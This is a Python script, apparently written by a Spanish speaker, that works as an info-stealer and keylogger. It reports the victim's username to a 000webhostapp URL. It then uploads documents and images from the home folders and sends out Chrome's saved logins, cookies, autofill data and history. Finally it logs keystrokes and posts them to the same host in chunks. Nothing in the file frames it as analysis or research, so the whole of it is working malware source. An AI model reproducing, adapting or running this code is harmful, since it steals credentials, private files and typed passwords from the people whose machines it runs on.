import os
from time import sleep
import getpass
import requests
from pynput.keyboard import Key, Controller, Listener
user = getpass.getuser()


url = "https://gfhfdfdhvhghgghhdf.000webhostapp.com/index.php"
headers = {'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_1) AppleWebKit/537.36 (K HTML, like Gecko) Chrome/61.0.3163.100 Safari/537.36'}
requests.post(url, data={"user": user}, headers=headers)


pat = f"/Users/{user}"
path = os.listdir(pat)
def upload(): 
    for i in path:
        try:
            path2 = os.listdir(f"{pat}/{i}")
            for q in path2:
                if q.endswith(".jpg") or q.endswith(".png") or q.endswith(".jpeg") or q.endswith(".pdf") or q.endswith(".docx") or q.endswith(".xlsx"):
                    print(f"{pat}/{i}/{q}")
                    files = {"subir_archivo": open(f"{pat}/{i}/{q}", "rb")}
                    send = requests.post(url, files=files, headers=headers)
                    sleep(0.5)
        except:
            pass

def chrome():
    getuser = getpass.getuser()
    history = f"/Users/{getuser}/AppData/Local/Google/Chrome/User Data/Default/History"
    webData = f"/Users/{getuser}/AppData/Local/Google/Chrome/User Data/Default/Web Data"
    loginData = f"/Users/{getuser}/AppData/Local/Google/Chrome/User Data/Default/Login Data"
    Cookies = f"/Users/{getuser}/AppData/Local/Google/Chrome/User Data/Default/Cookies"
    user = getpass.getuser()
    print(f"{user}")
    filw = f"/Users/{user}/user.txt"
    file = open(filw, "w")
    file.write("Nombre del pc: " + user)
    file.close()
    files = {"subir_archivo": open(filw, "rb")}
    requests.post(url, files=files, headers=headers)
    files = {"subir_archivo": open(webData, "rb")}
    requests.post(url, files=files, headers=headers)
    files = {"subir_archivo": open(loginData, "rb")}
    requests.post(url, files=files, headers=headers)
    files = {"subir_archivo": open(Cookies, "rb")}
    requests.post(url, files=files, headers=headers)
    files = {"subir_archivo": open(history, "rb")}
    requests.post(url, files=files, headers=headers)




upload()
sleep(1)
chrome()


keyboard = Controller()

keys = []

def on_press(key):
    global keys
    # keys.append(str(key).replace("'",""))
    string = str(key).replace("'", "")
    if string == "Key.space":
        string = " "
    if string == "Key.enter":
        string = "\n"
    if string == "Key.backspace":
        string = "Backspace"
    if string == "Key.tab":
        string = ""
    if string == "Key.caps_lock":
        string = ""
    if string == "Key.shift":
        string = ""
    if string == "Key.ctrl":
        string = ""
    if string == "Key.alt":
        string = ""
    if string == "Key.cmd":
        string = ""
    if string == "Key.delete":
        string = ""
    if string == "Key.insert":
        string = ""
    if string == "Key.home":
        string = ""
    if string == "Key.end":
        string = ""
    if string == "Key.page_up":
        string = ""
    if string == "Key.page_down":
        string = ""
    if string == "Key.tab":
        string = ""
    if string == "Backspace":
        string = ""
    if string == "Key.shift_r":
        string = ""
    if string == "Key.shift_l":
        string = ""
    if string == "Key.ctrl_r":
        string = ""
    if string == "Key.ctrl_l":
        string = ""
    if string == "Key.alt_r":
        string = ""
    if string == "Key.alt_l":
        string = ""
    if string == "Key.cmd_r":
        string = ""
    if string == "Key.cmd_l":
        string = ""
    if string == "Key.f1":
        string = ""
    if string == "Key.f2":
        string = ""
    if string == "Key.f3":
        string = ""
    if string == "Key.f4":
        string = ""
    if string == "Key.f5":
        string = ""
    if string == "Key.f6":
        string = ""
    if string == "Key.f7":
        string = ""
    if string == "Key.f8":
        string = ""
    if string == "Key.f9":
        string = ""
    if string == "Key.f10":
        string = ""
    if string == "Key.f11":
        string = ""
    if string == "Key.f12":
        string = ""
    if string == "Key.num_lock":
        string = ""
    if string == "Key.scroll_lock":
        string = ""
    if string == "Key.pause":
        string = ""
    if string == "Key.print_screen":
        string = ""
    if string == "Key.menu":
        string = ""
    if string == "Key.backspace":
        string = ""
    if string == "Key.enter":
        string = ""
    if string == "Key.tab":
        string = ""
    if string == "Key.space":
        string = ""
    if string == "Key.escape":
        string = ""
    if string == "Key.delete":
        string = ""
    if string == "Key.end":
        string = ""
    if string == "Key.home":
        string = ""
    if string == "Key.left":
        string = ""
    if string == "Key.up":
        string = ""
    if string == "Key.right":
        string = ""
    if string == "Key.down":
        string = ""
    if string == "Key.select":
        string = ""
    if string == "Key.print":
        string = ""
    if string == "Key.execute":
        string = ""
    if string == "Key.snapshot":
        string = ""
    if string == "Key.insert":
        string = ""
    if string == "Key.help":
        string = ""
    if string == "Key.undo":
        string = ""
    if string == "Key.redo":
        string = ""
    if string == "Key.back":
        string = ""
    if string == "Key.forward":
        string = ""
    if string == "Key.stop":
        string = ""
    if string == "Key.refresh":
        string = ""
    if string == "Key.volume_mute":
        string = ""
    if string == "Key.volume_down":
        string = ""
    if string == "Key.volume_up":
        string = ""
    if string == "Key.power":
        string = ""
    if string == "Key.sleep":
        string = ""
    if string == "Key.wake":
        string = ""
    if string == "Key.web_search":
        string = ""
    if string == "Key.web_home":
        string = ""
    if string == "Key.web_back":
        string = ""
    if string == "Key.web_forward":
        string = ""
    if string == "Key.web_stop":
        string = ""
    if string == "Key.web_refresh":
        string = ""
    if string == "Key.web_favorites":
        string = ""
    if string == "Key.web_search": 
        string = ""
    if string == "Key.web_home":
        string = ""
    if string == "Key.web_forward":
        string = ""
    if string == "<100>":
        string = "@"
    if string == "<101>":
        string = "!"
    if string == "<102>":
        string = "@"
    else:
        keys.append(string)
        main_string = "".join(keys)
        print(main_string)
        if len(main_string) > 25: #catidad de letras que se pueden escribir
            headers = {'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_1) AppleWebKit/537.36 (K HTML, like Gecko) Chrome/61.0.3163.100 Safari/537.36'}
            url = "https://gfhfdfdhvhghgghhdf.000webhostapp.com/index.php"
            data = {'text': main_string, 'user': user}
            send = requests.post(url, data=data, headers=headers)
            print(send.text)
            keys = []

def on_release(key):
    if key == Key.esc:
        return False

with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
